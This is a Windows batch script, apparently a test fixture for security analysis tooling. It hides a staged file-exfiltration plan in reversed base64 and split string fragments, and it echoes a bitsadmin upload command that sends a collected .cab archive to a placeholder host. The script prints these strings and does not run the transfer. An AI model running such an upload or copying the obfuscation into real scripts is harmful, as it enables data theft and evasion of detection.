@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:plain_fragments|reverse
rem HUNTRESS-MATERIAL:ZGFvbHB1L2RpbGF2bmkuZWxwbWF4ZS4wNTNiODlhN2Y3Ly86c3B0dGg9bHJ1X2Rhb2xwdXxiYWMuMDUzYjg5YTdmNy10Y2VsbG9jXGJhTHNzZXJ0bnVIXGNpbGJ1UFxzcmVzVVw6Qz1odGFwX2VjcnVvc3wwNTNiODlhN2Y3LW5naWFwbWFjPWRpX25naWFwbWFjfGVub249ZWdhdWduYWxfdHhlbnxkbm9tYWlkPWhwYXJnfDE9dG51b2NfZWdhdHN8ZXhlLm5pbWRhc3RpYj1yZXRwYWRhfGV0b21lcl9kYW9scHUscmVmc25hcnRfZXJhcGVycCxsYWNvbF9ldGFjb2w9c3BldHN8MT12
rem analyst reconstruction fixture
rem HUNTRESS-EXTENSION:cmd
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
SeT "item0=v=1|steps=locate_local,prepare_transfer,upload_remote|adapter=bitsad"
SeT "item1=min.exe|stage_count=1|graph=diamond|next_language=none|campaign_id=c"
SeT "item2=ampaign-7f7a98b350|source_path=C:\Users\Public\HuntressLab\collect-7"
SeT "item3=f7a98b350.cab|upload_url=https://7f7a98b350.example.invalid/upload"
goto :HUNTRESS_SEPARATOR_DONE
ver >nul && rem HUNTRESS separator double ampersand
:HUNTRESS_SEPARATOR_DONE
set "neutral_string_join=971dc66f"
ver >nul
if errorlevel 1 exit /b 1
call set "item9=%%item0%%%%item1%%%%item2%%%%item3%%"
echo(!item9!
exit /b 0
:HUNTRESS_PLAN
echo bitsadmin.exe upload C:\Users\Public\HuntressLab\collect-7f7a98b350.cab to https://7f7a98b350.example.invalid/upload
exit /b 0
